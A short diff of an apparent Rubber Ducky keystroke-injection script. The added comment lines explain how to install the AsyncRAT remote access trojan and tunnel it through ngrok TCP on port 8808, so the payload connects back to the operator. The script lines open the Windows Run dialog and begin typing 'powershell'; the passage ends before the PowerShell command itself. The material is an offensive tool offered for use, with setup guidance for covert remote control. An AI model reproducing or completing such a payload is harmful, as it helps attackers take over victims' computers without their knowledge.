@@ -1,3 +1,5 @@
+REM how to use first, install asyncRat, Second ngrok, then do ngrok tcp 8808 you need to setup a billing so you can use,
+REM and last do not copy the https:// in the tcp link and put the payload as the tcp and port and not the same port as the 8808 thats localhost
 WINDOWS r
 DELAY 430
 STRING powershell
